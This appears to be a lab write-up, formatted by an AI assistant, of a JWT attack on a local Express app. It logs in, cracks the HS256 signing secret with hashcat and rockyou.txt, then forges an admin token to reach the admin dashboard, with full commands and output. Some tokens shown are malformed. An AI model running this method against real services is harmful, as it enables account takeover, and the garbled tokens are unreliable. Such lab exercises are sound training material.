
---

### Commands and Outputs:

#### 1. Login with valid credentials:

```bash
curl -X POST http://localhost/login --header "Content-Type: application/json" --data '{"username": "user", "password": "user"}'
```

**Output:**

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsIWF0IjoxNjc1NDE2NzE1fQ.3vxLIVEcfPZlugDcq6gXl80R1iPJ37gKuayFHHGrO8k"
}
```

---

#### 2. Crack the JWT with Hashcat:

```bash
hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsIWF0IjoxNjc1NDE2NzE1fQ.3vxLIVEcfPZlugDcq6gXl80R1iPJ37gKuayFHHGrO8k /usr/share/wordlists/rockyou.txt
```

---

#### 3. Start the server:

```bash
node server.js
```

**Output:**

```plaintext
http://localhost:80
```

---

### Commands and Outputs:

#### 1. Hashcat cracking process:

```bash
hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsIWF0IjoxNjc1NDE2NzE1fQ.3vxLIVEcfPZlugDcq6gXl80R1iPJ37gKuayFHHGrO8k /usr/share/wordlists/rockyou.txt
```

**Output:**

```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlci...HGrO8k
Time.Started.....: Fri Feb 3 04:32:57 2023 (2 secs)
Time.Estimated...: Fri Feb 3 04:32:59 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 2389.4 kH/s (1.84ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3004416/14344385 (20.94%)
Rejected.........: 0/3004416 (0.00%)
Restore.Point....: 2998272/14344385 (20.90%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: ufcfighter12 -> u67jun6jn76ju7j7
Hardware.Mon.#1..: Util: 55%

Started: Fri Feb 3 04:32:57 2023
Stopped: Fri Feb 3 04:33:00 2023
```

---

#### 2. Verifying the cracked password:

```bash
hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsIWF0IjoxNjc1NDE2NzE1fQ.3vxLIVEcfPZlugDcq6gXl80R1iPJ37gKuayFHHGrO8k /usr/share/wordlists/rockyou.txt --show
```

**Output:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsIWF0IjoxNjc1NDE2NzE1fQ.3vxLIVEcfPZlugDcq6gXl80R1iPJ37gKuayFHHGrO8k:ucyxu6
```

---

### Cracked Password:

**`ucyxu6`**


---

### Command and Output:

We take the crack password go to jwt.io, grab our token, modify the user to admin and modify the signature to the cracked password and we get the dashboard to the admin

#### 1. Access the dashboard with a valid JWT for the admin user:

```bash
curl -i http://localhost/dashboard --Header 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImJhZCI6MTY3M3NTQxcjcxN0.i0dcCe2SYhx0ZYSAJSDSe7D23TpCBKfyoDzx2G1xeeSU'
```

**Output:**

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 45
ETag: W/"2d-bqhMS3LH08+zkhZI3cPwYShjqaE"
Date: Fri, 03 Feb 2023 09:35:35 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{
  "message": "Welcome to your dashboard admin"
}
```

---

Let me know if you'd like additional formatting or further customization for your notes!